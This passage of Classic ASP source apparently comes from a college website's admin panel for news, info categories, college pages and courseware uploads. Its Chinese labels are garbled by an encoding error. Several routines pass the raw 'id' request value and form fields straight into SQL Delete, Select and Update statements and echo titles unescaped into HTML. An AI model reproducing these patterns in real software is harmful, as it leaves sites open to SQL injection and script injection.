	Maininfo=Table1H&Maininfo&"</table>"&TaleLine&"<BR><center>"&Submit&"</Form>"
End If
End Sub
'
Private Sub Class_Terminate()
	Set FSYS=NoThing
End Sub
End Class
'
Class AClass
Public AdminMenu,MainInfo,ActionName,Operate,ErrMsg,SID,DID
Private ReOperate,NowDo,Rinfo,Linfo,OP,SStr,ListMenu,Currentpage,Maxrecord,Totalrecords,Npage,PageURL
Private Sub Class_Initialize()
MainInfo=""
Set ReOperate=New TaleStr
ReOperate.StrIn="operate{c}s{c}t{c}t{c}op{c}s{c}t{c}t{c}id{c}s{c}t{c}t"
ReOperate.StrName="�������|����|ID��"
ReOperate.RequestStr()
Operate=ReOperate.StrOut(0)
OP=ReOperate.StrOut(1)
DID=ReOperate.StrOut(2)
Operate=ReOperate.NumStr(Operate,0,0)
Set ReOperate=Nothing
End Sub
'
Private Sub Class_Terminate()
End Sub
'
Public Default Sub DoDefault()
Select Case SID
Case 0
	AdminMenu="�����б�|���ӷ���|�ϲ�����|���Ź���|��������"
	ActionName="���Ź���"
	SStr="new"
Case 1
	AdminMenu="�����б�|���ӷ���|�ϲ�����|��Ѷ����|������Ѷ"
	ActionName="��Ѷ����"
	SStr="info"
End Select
Select Case Operate
Case "0"
	If OP="del" Then
		DelDate()
	Else
		SortList()
	End If
Case "1"
	AddSort()
Case "2"
	JoinSort()
Case "3"
	If op="del" Then
		DelInfo()
	Else
		ListData()
	End If
Case "4"
	PostData()
Case Else
	SortList()
End Select
End Sub
'
Private Sub JoinSort()
	Maininfo="�˹�����ȴ���ʽ�汾"
End Sub
Private Sub ListData()

	Set TaleRS=Conn.ExeCute("Select * From ljy_sort where l_sid="&SID&"")
	If Not TaleRs.Eof Then
		Maininfo=Maininfo&"<Div Style='height:18px'>"
		Do While Not TaleRs.Eof 
		Maininfo=Maininfo&"&nbsp;&nbsp;<a href=admin.asp?action="&SStr&"&operate=3&id="&Talers("l_id")&" Class=list  title='����˷���'>"&TaleRS("l_title")&"</a>"
		TaleRs.MoveNext
		Loop
	Maininfo=Maininfo&"</Table>"
	Else
		Maininfo="<img src=image/arr.gif>&nbsp;Ŀǰ��û�з��࣬�����ұߵĲ˵����м���<p>"
	End If
		ShowDate
		Maininfo=TableH&Pwidth&Maininfo&TableF
	Set TaleRS=NoThing
End Sub
Public Sub ShowDate()
Currentpage=Trim(Request("page"))
Maxrecord=Templates.Normal(2)
If Currentpage<>"" then
	If isnumeric(Currentpage)=True then
        		Currentpage=Currentpage
	Else
        		Currentpage=1
	End if
Else
Currentpage=1
End if
	PageUrl="info.asp?action="&SStr&"&operate=2"
	If Did="" Then 
		TaleSQL="Select C.l_id, C.l_time,C.l_title From [ljy_info] C inner join [ljy_sort] S on (S.l_id=C.l_sid and S.l_sid="&SID&") order by C.l_time desc"
	Else
		TaleSQL="Select   l_id,l_time,l_title From [ljy_info] where l_sid="&Did&" order by l_time desc"
	End If
	Set Talers=Server.Createobject("Adodb.recordset")
	Talers.open Talesql,Conn,1,1
	If Not Talers.Eof Then
	Maininfo=Maininfo&"<table cellSpacing=5 cellPadding=0 width=95%  border=0 align=center>"
		Totalrecords=Talers.Recordcount
	If Totalrecords Mod Maxrecord=0 Then
		Npage=Totalrecords\Maxrecord
	Else
		Npage=Totalrecords\Maxrecord+1
	End if
	i=0
	If Currentpage=1 Then
		Call ListPanel
	Else
     		 If (Currentpage-1)*Maxrecord<Totalrecords Then
      			Talers.Move (Currentpage-1)*Maxrecord
      			Call ListPanel
      		Else 
     			Currentpage=1
      			Call ListPanel
		End if
	End if
		Maininfo=Maininfo&"</table>"
		Maininfo=Maininfo&Templates.ListPages("��¼",PageUrl,Totalrecords,MaxRecord,Npage,Currentpage)
	Else
		Maininfo=TableH&Pwidth&Maininfo&"<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Ŀǰ���޼�¼"&TableF
	End If
	Set TaleRs=Nothing


	End Sub

	Private Sub ListPanel()
	Do While Not Talers.Eof 
	 Maininfo=Maininfo&"<tr><td width=350><img src=image/arr.gif>&nbsp; <a href=show.asp?id="&Talers("l_id")&" target=_blank title='"&Talers("l_title")&"'>"
	If Len(Talers("l_title"))>20 Then
		Maininfo=Maininfo&Left(Talers("l_title"),20)&"..."
	Else
		Maininfo=Maininfo&Talers("l_title")
	End If
	Maininfo=Maininfo&"</a></td><td>["&Year(Talers("l_time"))&"/"&Month(Talers("l_time"))&"/"&Day(Talers("l_time"))&"] </td><td><a href=admin.asp?action="&SStr&"&operate=4&op=edit&id="&TaleRS("l_id")&" class=list title='�༭ ["&TaleRS("l_title")&"]'>�༭</a></td><td><a href=admin.asp?action="&SStr&"&operate=3&op=del&id="&TaleRS("l_id")&" title='ɾ�� ["&TaleRS("l_title")&"]' class=list onclick="&Chr(34)&"return ask('ȷ��Ҫɾ��\n["&TaleRS("l_title")&"]��');"&Chr(34)&">ɾ��</a></td></tr>"
	i=i+1
If i>=Maxrecord Then
	Exit Do
End if
Talers.Movenext
Loop
	End Sub
Private Sub SortList()
	Set TaleRS=Conn.ExeCute("Select l_id,l_title From ljy_sort where l_sid="&SID&"")
	If Not TaleRs.Eof Then
		Maininfo=Maininfo&"<Table>"
		Do While Not TaleRs.Eof 
		Maininfo=Maininfo&" <tr><td width=40 align=right><img src=image/arr.gif></td><td width=400>&nbsp;&nbsp;<a href=admin.asp?action="&SStr&"&operate=3&id="&TaleRs("l_id")&" Class=list>"&TaleRS("l_title")&"</a></td><td><a href=admin.asp?action="&SStr&"&operate=1&op=edit&id="&TaleRS("l_id")&" class=list title='�༭ ["&TaleRS("l_title")&"]'>�༭</a></td><td><a href=admin.asp?action="&SStr&"&operate=0&op=del&id="&TaleRS("l_id")&" title='ɾ�� ["&TaleRS("l_title")&"]' class=list onclick="&Chr(34)&"return ask('ȷ��Ҫɾ��\n["&TaleRS("l_title")&"]��');"&Chr(34)&">ɾ��</a></td></tr>"
		TaleRs.MoveNext
		Loop
	Maininfo=Maininfo&"</Table>"
	Else
		Maininfo="<img src=image/arr.gif>&nbsp;Ŀǰ��û�з��࣬�����ұߵĲ˵����м���<p>"
	End If

		Maininfo=TableH&Pwidth&Maininfo&TableF
	Set TaleRS=NoThing
End Sub
Private Sub AddSort
If Request.Form("submit")<>"" Then
Set ReOperate=New TaleStr
ReOperate.StrIn="str0{c}f{c}f{c}f{c}str1{c}f{c}f{c}f"
ReOperate.StrName="��������|�������"
ReOperate.RequestStr()
If ReOperate.StrOut(0)="" Or  ReOperate.StrOut(1)="" Then ErrMsg="<li>���������д����"
If ErrMsg="" Then
	if IsNumeric(DID) And DID<>"" Then 
		Conn.ExeCute("Update ljy_sort set l_title='"&ReOperate.StrOut(0)&"',l_intro='"&ReOperate.StrOut(1)&"',l_time=Now,l_buildman='"&Templates.Adminname&"',l_ip='"&Templates.UserIP&"'  where l_id="&DID&"")
		Maininfo=Maininfo&"�༭�ɹ�,�������������"
	Else
		Conn.Execute("Insert into ljy_sort (l_sid,l_title,l_intro,l_buildman,l_ip) values ("&SID&",'"&ReOperate.StrOut(0)&"','"&ReOperate.StrOut(1)&"','"&Templates.Adminname&"','"&Templates.UserIP&"')")
		Maininfo=Maininfo&"���ӳɹ�,�������������"
	End If
	Maininfo=TableH&Pwidth&"����<font color=#006600>"&ReOperate.StrOut(0)&"</font>"&Maininfo&"<p>"&TableF
End If
Set ReOperate=Nothing
Else
	Dim Title,Intro
	If Op="edit" Then
		Set TaleRs=Conn.Execute("Select l_title,l_intro from ljy_sort where l_id="&DID&"")
		IF Not Talers.Eof Then
		Title=Talers("l_title")
		Intro=Talers("l_intro")
		Set Talers=NoThing
		End If
	End If
	Templates.Trline=Replace(Templates.Trline,"{tdwidth}","15%")
	Maininfo=Maininfo&Replace(Templates.Trline,"{bgcolor}","#FFFFFF")
	Dim UAction
	UAction="admin.asp?action="&SStr&"&operate=1"
	If Op="edit" Then UAction=UAction&"&id="&DID
	Maininfo=Replace(Maininfo,"{leftinfo}","<Form name=TaleForm action='"&UAction&"' method=post>��������")
	Maininfo=Replace(Maininfo,"{rightinfo}","<input  name='str0' value='"&Title&"' class=input2>")
	Maininfo=Maininfo&Replace(Templates.Trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","�������")
	Maininfo=Replace(Maininfo,"{rightinfo}","<BR>&nbsp;&nbsp;&nbsp;&nbsp;HTML֧��<BR>&nbsp;&nbsp;&nbsp;&nbsp;<textarea  name='str1'  class='input2' style='width:80%;height:80'>"&Intro&"</textarea><BR>&nbsp;&nbsp;&nbsp;&nbsp;")
	Maininfo=Table1H&Maininfo&"</table>"&TaleLine&"<BR><center>"&Submit&"</Form>"
End If
End Sub
'
Private Sub DelDate()
	If DID="" Then ErrMsg="<li>����ID�Ų���Ϊ��,ɾ��ʧ��"
	'������������ݲ���ɾ��

	If ErrMsg="" Then
		Conn.ExeCute("Delete*from ljy_sort where l_id="&DID&"")
		Maininfo=TableH&Pwidth&"ɾ���ɹ�,�������������"&TableF
	End IF
	Set ReOperate=NoThing
End Sub
'
'
Private Sub DelInfo()
	If DID="" Then ErrMsg="<li>����ID�Ų���Ϊ��,ɾ��ʧ��"
	If ErrMsg="" Then
		Conn.ExeCute("Delete*from ljy_info where l_id="&DID&"")
		Maininfo=TableH&Pwidth&"ɾ���ɹ�,�������������"&TableF
	End IF
	Set ReOperate=NoThing
End Sub
'
Private Sub PostData()
If Request.Form("submit")<>"" Then
	Set ReOperate=New TaleStr
	ReOperate.StrIn="str0{c}f{c}f{c}f{c}str1{c}f{c}f{c}f{c}str2{c}f{c}f{c}f{c}str3{c}f{c}t{c}t{c}str4{c}f{c}t{c}t{c}str5{c}f{c}t{c}t"
	ReOperate.StrName="����|*Tale*|HTML֧��|*Tale*|����|*Tale*|�ؼ���|*Tale*|����|*Tale*|�ö�����"
	ReOperate.RequestStr()
	ReOperate.LenStr ReOperate.StrOut(0),0,1,30
	ReOperate.LenStr ReOperate.StrOut(2),2,1,50*1024
	ReOperate.StrOut(5)=ReOperate.NumStr(ReOperate.StrOut(5),0,0)
	If ReOperate.StrOut(0)="" Or ReOperate.StrOut(2)="" Or ReOperate.StrOut(3)="" Then ErrMsg=ErrMsg&"<li>����δ��д��ȫ"
	If ReOperate.StrOut(4)="" Then ErrMsg=Errmsg&"<li>���Ƚ�������"
	ErrMsg=ErrMsg&ReOperate.ErrMsg
	If ErrMsg="" THen
		if IsNumeric(DID) And DID<>"" Then 
		Conn.ExeCute("Update ljy_info set l_sid="&ReOperate.StrOut(4)&",l_title='"&ReOperate.StrOut(0)&"',l_content='"&ReOperate.StrOut(2)&"',l_html="&ReOperate.StrOut(1)&",l_time=Now,l_postman='"&Templates.Adminname&"',l_ip='"&Templates.UserIP&"',l_keyword='"&ReOperate.StrOut(3)&"',l_top="&ReOperate.StrOut(5)&"  where l_id="&DID&"")
		Maininfo=Maininfo&"�༭�ɹ�,�������������"
		Else
		Conn.Execute("Insert into ljy_info (l_sid,l_title,l_content,l_html,l_postman,l_ip,l_keyword,l_top) values ("&ReOperate.StrOut(4)&",'"&ReOperate.StrOut(0)&"','"&ReOperate.StrOut(2)&"',"&ReOperate.StrOut(1)&",'"&Templates.Adminname&"','"&Templates.UserIP&"','"&ReOperate.StrOut(3)&"',"&ReOperate.StrOut(5)&")")
		Maininfo=Maininfo&"�����ɹ�,�������������"
		End IF
		Maininfo=TableH&Pwidth&ReOperate.StrOut(0)&Maininfo&"<p>"&TableF

	End IF
	Set ReOperate=NoThing
Else
	Dim Title,Html,Content,KeyWord,TopDay,SortID
	If Op="edit" Then
		Set TaleRs=Conn.Execute("Select * from ljy_info where l_id="&DID&"")
		IF Not Talers.Eof Then
		Title=Talers("l_title")
		Content=Talers("l_content")
		Html=Talers("l_html")
		KeyWord=Talers("l_keyword")
		TopDay=Talers("l_top")
		SortID=Talers("l_sid")
		Set Talers=NoThing
		End If
	End If
	Templates.Trline=Replace(Templates.Trline,"{tdwidth}","15%")
	Maininfo=Maininfo&Replace(Templates.Trline,"{bgcolor}","#FFFFFF")
	Dim UAction
	UAction="admin.asp?action="&SStr&"&operate=4"
	If Op="edit" Then UAction=UAction&"&id="&DID
	Maininfo=Replace(Maininfo,"{leftinfo}","<Form name=TaleForm action='"&Uaction&"' method=post>����")
	Maininfo=Replace(Maininfo,"{rightinfo}","<input  name='str0' value='"&Title&"' class=input2>")
	Maininfo=Maininfo&Replace(Templates.Trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","�ؼ���")
	Maininfo=Replace(Maininfo,"{rightinfo}","<input  name='str3' value='"&KeyWord&"' class=input2> (���ڲ�ѯ�������,��ͬ�ؼ�����|�ֿ�)")
	Maininfo=Maininfo&Replace(Templates.Trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","��������")
Dim SSelect
SSelect="<select size=1 name=str4>"
Set TaleRs=Conn.ExeCute("Select l_id,l_title from ljy_sort where l_sid="&SID&"")
If Not TaleRs.Eof  Then
	Do while NOt talers.Eof
		SSelect=SSelect&"<option value='"&Talers("l_id")&"' "
		If Cint(Talers("l_id"))=Cint(SortID) Then SSelect=SSelect&"selected"
		SSelect=SSelect&">"&TaleRs("l_title")&"</option>"
	Talers.MoveNext
	Loop
End If
SSelect=SSelect&"</select>"
Set Talers=NoThing
	Maininfo=Replace(Maininfo,"{rightinfo}",SSelect)
If SID=0 Then
	Maininfo=Maininfo&Replace(Templates.Trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","�ö�����")
	Maininfo=Replace(Maininfo,"{rightinfo}","<select size=1 name='str5'>"&Templates.NumOption(1,"��",0,30,TopDay,0)&"</select> ( �˹����ǽ�������������ҳ�ö�����N�� )")
End If
	Maininfo=Maininfo&Replace(Templates.Trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","��ǩ֧��")
	Dim HtmlIS
	HTMLIS="<input type=radio name='str1' value='1' "
	If Html=True Then  HTMLIS=	HTMLIS&"checked"
	HTMLIS=	HTMLIS&">HTML֧��&nbsp;&nbsp;&nbsp;&nbsp;<input type=radio name='str1' value='0'  "
	If Html=False Then 	HTMLIS=	HTMLIS&"checked"
	HTMLIS=	HTMLIS&">UBB֧��"
	Maininfo=Replace(Maininfo,"{rightinfo}",HTMLis)
	Maininfo=Maininfo&Replace(Templates.Trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","UBB��ǩ")
	Set Talers=Conn.ExeCute("Select ubb from ljy_ubbcode")
	If Not Talers.Eof Then
	Maininfo=Replace(Maininfo,"{rightinfo}",Talers("ubb"))
	End If
	Set Talers=NoThing
	Maininfo=Maininfo&Replace(Templates.Trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","����")
	Maininfo=Replace(Maininfo,"{rightinfo}","<BR>&nbsp;&nbsp;&nbsp;&nbsp;<textarea  name='str2'  class='input2' style='width:95%;height:300'>"&Content&"</textarea><BR>&nbsp;&nbsp;&nbsp;&nbsp;")
	Maininfo=Maininfo&Replace(Templates.Trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","�ϴ�ͼƬ")
	Maininfo=Replace(Maininfo,"{rightinfo}","<iframe marginwidth=0 frameborder=0 width='95%' height=25 src='upform.asp?action=1'></iframe>")
	Maininfo=Table1H&Maininfo&"</table>"&TaleLine&"<BR><center>"&Submit&"</Form>"
End IF
End Sub
'
End Class
'
Class DataClass
Public AdminMenu,MainInfo,ActionName,Operate,ErrMsg,SID,DID
Private ReOperate,NowDo,Rinfo,Linfo,SStr,OP
Private Sub Class_Initialize()
AdminMenu="�����б�|����������"
MainInfo=""
Set ReOperate=New TaleStr
ReOperate.StrIn="operate{c}s{c}t{c}t{c}op{c}s{c}t{c}t{c}id{c}s{c}t{c}t"
ReOperate.StrName="�������|����|ID��"
ReOperate.RequestStr()
Operate=ReOperate.StrOut(0)
OP=ReOperate.StrOut(1)
DID=ReOperate.StrOut(2)
Operate=ReOperate.NumStr(Operate,0,0)
Set ReOperate=Nothing
End Sub
'
Private Sub Class_Terminate()
End Sub
'
Public Default Sub DoDefault()
Select Case  SID
Case 0
	ActionName="ѧԺ����"
	SStr="intro"
Case 1
	ActionName="���л"
	SStr="edu"
Case 2
	ActionName="��ѧ����"
	SStr="build"
Case 3
	ActionName="ѧ������"
	SStr="stu"
End Select
Select Case Operate
Case "0"
	If OP="del" Then
		DelDate()
	Else
		ListDate()
	End If
Case "1"
	PostDate()
Case Else
	ListDate()
End Select
End Sub
'
Private Sub ListDate()
	Set TaleRS=Conn.ExeCute("Select * From ljy_collegedata where l_sid="&SID&"")
	If Not TaleRs.Eof Then
		j=0
		Maininfo=Maininfo&"<Table>"
		Do While Not TaleRs.Eof 
		Maininfo=Maininfo&" <tr><td width=40 align=right><img src=image/arr.gif></td><td width=400>&nbsp;&nbsp;<a href=intro.asp?action="&SStr&"&operate="&j&" Class=list target=_blank>"&TaleRS("l_title")&"</a></td><td><a href=admin.asp?action="&SStr&"&operate=1&op=edit&id="&TaleRS("l_id")&" class=list title='�༭ ["&TaleRS("l_title")&"]'>�༭</a></td><td><a href=admin.asp?action="&SStr&"&operate=0&op=del&id="&TaleRS("l_id")&" title='ɾ�� ["&TaleRS("l_title")&"]' class=list onclick="&Chr(34)&"return ask('ȷ��Ҫɾ��\n["&TaleRS("l_title")&"]��');"&Chr(34)&">ɾ��</a></td></tr>"
		TaleRs.MoveNext
		j=j+1
		Loop
	Maininfo=Maininfo&"</Table>"
	Else
		Maininfo="<img src=image/arr.gif>&nbsp;Ŀǰ��û�м�¼�������ұߵĲ˵����м���<p>"
	End If

		Maininfo=TableH&Pwidth&Maininfo&TableF
	Set TaleRS=NoThing
End Sub
'
Private Sub PostDate()
If Request.Form("submit")<>"" Then
	Set ReOperate=New TaleStr
	ReOperate.StrIn="str0{c}f{c}f{c}f{c}str1{c}f{c}t{c}t{c}str2{c}f{c}f{c}f"
	ReOperate.StrName="����|*Tale*|HTML֧��|*Tale*|����"
	ReOperate.RequestStr()
	ReOperate.LenStr ReOperate.StrOut(0),0,1,30
	ReOperate.LenStr ReOperate.StrOut(2),2,1,50*1024
	If ReOperate.StrOut(0)="" Or ReOperate.StrOut(2)="" Then ErrMsg="<li>����δ��д��ȫ"
	ErrMsg=ErrMsg&ReOperate.ErrMsg
	If ErrMsg="" THen
		if IsNumeric(DID) And DID<>"" Then 
		Conn.ExeCute("Update ljy_collegedata set l_title='"&ReOperate.StrOut(0)&"',l_content='"&ReOperate.StrOut(2)&"',l_html="&ReOperate.StrOut(1)&",l_time=Now,l_postman='"&Templates.Adminname&"',l_ip='"&Templates.UserIP&"'  where l_id="&DID&"")
		Maininfo=Maininfo&"�༭�ɹ�,�������������"
		Else
		Conn.Execute("Insert into ljy_collegedata (l_sid,l_title,l_content,l_html,l_postman,l_ip) values ("&SID&",'"&ReOperate.StrOut(0)&"','"&ReOperate.StrOut(2)&"',"&ReOperate.StrOut(1)&",'"&Templates.Adminname&"','"&Templates.UserIP&"')")
		Maininfo=Maininfo&"�����ɹ�,�������������"
		End IF
		Maininfo=TableH&Pwidth&ReOperate.StrOut(0)&Maininfo&"<p>"&TableF

	End IF
	Set ReOperate=NoThing
Else
	Dim Title,Html,Content
	If Op="edit" Then
		Set TaleRs=Conn.Execute("Select l_title,l_content,l_html from ljy_collegedata where l_id="&DID&"")
		IF Not Talers.Eof Then
		Title=Talers("l_title")
		Content=Talers("l_content")
		Html=Talers("l_html")
		Set Talers=NoThing
		End If
	End If
	Templates.Trline=Replace(Templates.Trline,"{tdwidth}","15%")
	Maininfo=Maininfo&Replace(Templates.Trline,"{bgcolor}","#FFFFFF")
	Dim UAction
	UAction="admin.asp?action="&SStr&"&operate=1"
	If Op="edit" Then UAction=UAction&"&id="&DID
	Maininfo=Replace(Maininfo,"{leftinfo}","<Form name=TaleForm action='"&Uaction&"' method=post>��������")
	Maininfo=Replace(Maininfo,"{rightinfo}","<input  name='str0' value='"&Title&"' class=input2>")
	Maininfo=Maininfo&Replace(Templates.Trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","��ǩ֧��")
	Dim HtmlIS
	HTMLIS="<input type=radio name='str1' value='1' "
	If Html=True Then  HTMLIS=	HTMLIS&"checked"
	HTMLIS=	HTMLIS&">HTML֧��&nbsp;&nbsp;&nbsp;&nbsp;<input type=radio name='str1' value='0'  "
	If Html=False Then 	HTMLIS=	HTMLIS&"checked"
	HTMLIS=	HTMLIS&">UBB֧��"
	Maininfo=Replace(Maininfo,"{rightinfo}",HTMLis)
	Maininfo=Maininfo&Replace(Templates.Trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","UBB��ǩ")
	Set Talers=Conn.ExeCute("Select ubb from ljy_ubbcode")
	If Not Talers.Eof Then
	Maininfo=Replace(Maininfo,"{rightinfo}",Talers("ubb"))
	End If
	Set Talers=NoThing
	Maininfo=Maininfo&Replace(Templates.Trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","��������")
	Maininfo=Replace(Maininfo,"{rightinfo}","<BR>&nbsp;&nbsp;&nbsp;&nbsp;<textarea  name='str2'  class='input2' style='width:95%;height:300'>"&Content&"</textarea><BR>&nbsp;&nbsp;&nbsp;&nbsp;")
	Maininfo=Maininfo&Replace(Templates.Trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","�ϴ�ͼƬ")
	Maininfo=Replace(Maininfo,"{rightinfo}","<iframe marginwidth=0 frameborder=0 width='95%' height=25 src='upform.asp?action=1'></iframe>")
	Maininfo=Table1H&Maininfo&"</table>"&TaleLine&"<BR><center>"&Submit&"</Form>"
End IF
End Sub
'
Private Sub DelDate()
	If DID="" Then ErrMsg="<li>����ID�Ų���Ϊ��,ɾ��ʧ��"
	If ErrMsg="" Then
		Conn.ExeCute("Delete*from ljy_collegedata where l_id="&DID&"")
		Maininfo=TableH&Pwidth&"ɾ���ɹ�,�������������"&TableF
	End IF
	Set ReOperate=NoThing
End Sub
'
End Class
'
Class DownClass
Public AdminMenu,MainInfo,ActionName,Operate,ErrMsg,SID,DID
Private ReOperate,NowDo,Rinfo,Linfo,SStr,OP
Private Sub Class_Initialize()
AdminMenu="�����μ��б�|�������μ�|�����¿μ�"
ActionName="������ҳ"
MainInfo=""
Set ReOperate=New TaleStr
ReOperate.StrIn="operate{c}s{c}t{c}t{c}op{c}s{c}t{c}t{c}id{c}s{c}t{c}t"
ReOperate.StrName="�������|����|ID��"
ReOperate.RequestStr()
Operate=ReOperate.StrOut(0)
OP=ReOperate.StrOut(1)
DID=ReOperate.StrOut(2)
Operate=ReOperate.NumStr(Operate,0,0)
Set ReOperate=Nothing
End Sub
'
Private Sub Class_Terminate()
End Sub
'
Public Default Sub DoDefault()
Select Case Operate
Case "0"
		If OP="del" Then
		DelDate()
	Else
		SortList()
	End If
Case "1"
		If OP="pass" Then
		PassDate()
	Else
		ASortList()
	End If
Case "2"
	PostSoft()
Case Else
	BBSIntro()
End Select
End Sub
Public Sub PostSoft()
If Request.Form("submit")<>"" Then
	Set ReOperate=New TaleStr
	ReOperate.StrIn="str0{c}f{c}f{c}f"
	For i=1 to 6
		ReOperate.StrIn=ReOperate.StrIn&"{c}str"&i&"{c}f{c}f{c}f"
	Next
	session("filename")=""
	ReOperate.StrName="�μ�����|*Tale*|�μ���С|*Tale*|�μ���ַ|*Tale*|��Ĵ���|*Tale*|��ϵ����|*Tale*|�Ƿ񷢲�|*Tale*|�μ�����"
	ReOperate.RequestStr()
	ReOperate.LenStr ReOperate.StrOut(0),0,1,30
	ReOperate.StrOut(1)=ReOperate.NumStr(ReOperate.StrOut(1),1,1)
	ReOperate.LenStr ReOperate.StrOut(2),2,1,200
	ReOperate.LenStr ReOperate.StrOut(6),6,1,10*1024
	ReOperate.IsEmail ReOperate.StrOut(4),4
	ReOperate.StrOut(5)=ReOperate.NumStr(ReOperate.StrOut(5),0,0)
	If ReOperate.StrOut(3)=""  Or ReOperate.StrOut(1)="" Or ReOperate.StrOut(6)="" Then ErrMsg="<li>����δ��д��ȫ"
	ErrMsg=ErrMsg&ReOperate.ErrMsg
	If ErrMsg="" THen
		if IsNumeric(DID) And DID<>"" Then 
		If Templates.Adminname="" or Templates.Adminpassword="" or Templates.Adminnum="" Then
				ErrMsg="��û�����Ȩ��"
				Exit Sub
		End IF
		Conn.ExeCute("Update ljy_soft set l_title='"&ReOperate.StrOut(0)&"',l_size="&ReOperate.StrOut(1)&",l_downurl='"&ReOperate.StrOut(2)&"',l_time=Now,l_postman='"&ReOperate.StrOut(3)&"',l_ip='"&Templates.UserIP&"' ,l_email='"&ReOperate.StrOut(4)&"',l_intro= '"&ReOperate.StrOut(6)&"',l_post="&ReOperate.StrOut(5)&"  where l_id="&DID&"")
		Maininfo=Maininfo&"�༭�ɹ�,�������������"
		Else
		Conn.Execute("Insert into ljy_soft (l_title,l_size,l_downurl,l_postman,l_email,l_post,l_intro,l_ip) values ('"&ReOperate.StrOut(0)&"',"&ReOperate.StrOut(1)&",'"&ReOperate.StrOut(2)&"','"&ReOperate.StrOut(3)&"','"&ReOperate.StrOut(4)&"','"&ReOperate.StrOut(5)&"','"&ReOperate.StrOut(6)&"','"&Templates.UserIP&"')")
		If Templates.Adminname="" or Templates.Adminpassword="" or Templates.Adminnum="" Then
			Maininfo=Maininfo&"�ϴ��μ��ɹ�,��ȴ�����Ա���,лл����֧��!"
		Else
		Maininfo=Maininfo&"�����ɹ�,�������������"
		End If
		End IF
		Maininfo=TableH&Pwidth&ReOperate.StrOut(0)&Maininfo&"<p>"&TableF

	End IF
	Set ReOperate=NoThing
Else
	Dim Title,Size,URL,Name,Email,Intro,HTML
	If Op="edit" Then
		Set TaleRs=Conn.Execute("Select * from ljy_soft where l_id="&DID&"")
		IF Not Talers.Eof Then
		Title=Talers("l_title")
		Size=Talers("l_size")
		URL=Talers("l_downurl")
		Name=Talers("l_postman")
		Email=Talers("l_email")
		Intro=Talers("l_intro")
		Html=Talers("l_post")
		Set Talers=NoThing
		End If
	End If
	Templates.Trline=Replace(Templates.Trline,"{tdwidth}","15%")
	Maininfo=Maininfo&Replace(Templates.Trline,"{bgcolor}","#FFFFFF")
	Dim UAction
	If Templates.Adminname="" or Templates.Adminpassword="" or Templates.Adminnum="" Then
		Uaction="up.asp"
	Else
		UAction="admin.asp?action=down&operate=2&id="&DID&""
	End If
	Maininfo=Replace(Maininfo,"{leftinfo}","<Form name=TaleForm action='"&Uaction&"' method=post>�μ�����")
	Maininfo=Replace(Maininfo,"{rightinfo}","<input  name='str0' value='"&Title&"' class=input2>")
	Maininfo=Maininfo&Replace(Templates.Trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","�μ���С")
	Maininfo=Replace(Maininfo,"{rightinfo}","<input  name='str1' value='"&Size&"' class=input2> ( ��λ KB )")
	Maininfo=Maininfo&Replace(Templates.Trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","�μ���ַ")
	Maininfo=Replace(Maininfo,"{rightinfo}","<input  name='str2' value='"&URl&"' class=input2> ( ������ϴ��������޸Ĵ�ѡ�� )")
	Maininfo=Maininfo&Replace(Templates.Trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","��Ĵ���")
	Maininfo=Replace(Maininfo,"{rightinfo}","<input  name='str3' value='"&Name&"' class=input2>")
	Maininfo=Maininfo&Replace(Templates.Trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","��ϵ����")
	Maininfo=Replace(Maininfo,"{rightinfo}","<input  name='str4' value='"&Email&"' class=input2>")
	If Templates.Adminname<>"" and Templates.Adminpassword<>"" and Templates.Adminnum<>"" Then
	Maininfo=Maininfo&Replace(Templates.Trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","�Ƿ񷢲�")
	Dim HtmlIS
	HTMLIS="<input type=radio name='str5' value='1' "
	If Html=True Then  HTMLIS=	HTMLIS&"checked"
	HTMLIS=	HTMLIS&">������&nbsp;&nbsp;&nbsp;&nbsp;<input type=radio name='str5' value='0'  "
	If Html=False Then 	HTMLIS=	HTMLIS&"checked"
	HTMLIS=	HTMLIS&">�ݲ�����"
	Maininfo=Replace(Maininfo,"{rightinfo}",HTMLis)
	End If
	Maininfo=Maininfo&Replace(Templates.Trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","�μ�����")
	Maininfo=Replace(Maininfo,"{rightinfo}","<BR>&nbsp;&nbsp;&nbsp;&nbsp;<textarea  name='str6'  class='input2' style='width:80%;height:80'>"&Intro&"</textarea><BR>&nbsp;&nbsp;&nbsp;&nbsp;")
	Maininfo=Maininfo&Replace(Templates.Trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","�ϴ�ͼƬ")
	Maininfo=Replace(Maininfo,"{rightinfo}","<iframe marginwidth=0 frameborder=0 width='95%' height=25 src='upform.asp'></iframe>")
	Maininfo=Table1H&Maininfo&"</table>"&TaleLine&"<BR><center>"&Submit&"</Form>"
End IF
End Sub
'
Private Sub SortList()
	Set TaleRS=Conn.ExeCute("Select l_id,l_title From ljy_soft where l_post=true")
	If Not TaleRs.Eof Then
		Maininfo=Maininfo&"<Table>"
		Do While Not TaleRs.Eof 
